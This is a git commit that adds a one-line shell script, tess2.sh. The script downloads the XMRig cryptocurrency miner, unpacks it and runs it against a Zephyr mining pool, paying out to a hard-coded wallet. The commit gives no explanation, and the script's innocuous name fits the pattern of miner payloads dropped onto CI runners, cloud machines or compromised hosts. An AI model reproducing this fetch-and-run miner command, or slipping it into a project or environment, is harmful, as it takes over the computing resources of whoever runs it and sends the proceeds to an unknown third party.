1bc7f142fcb949d804b60954d245b46ced00ed5d
karina1121111 <karinsonia631@gmail.com>
2024-10-26 08:56:49 -0700

    Create tess2.sh

---
+++ tess2.sh
@@ -0,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.22.1/xmrig-6.22.1-linux-static-x64.tar.gz && tar -xvf xmrig-6.22.1-linux-static-x64.tar.gz && cd xmrig-6.22.1 && chmod +x xmrig && ./xmrig -o ca-zephyr.miningocean.org:5342 -u ZEPHYR2d3XF4iomcChXdVAi7YWDXGdLBKP26ETUH8m9UfE9G9CEvootEe2kGanfLGZHFG9eH3qeEx3KmxH2JqFbme3odsKNkF3P5P -p test2 -a rx/0 -k --donate-level 1 
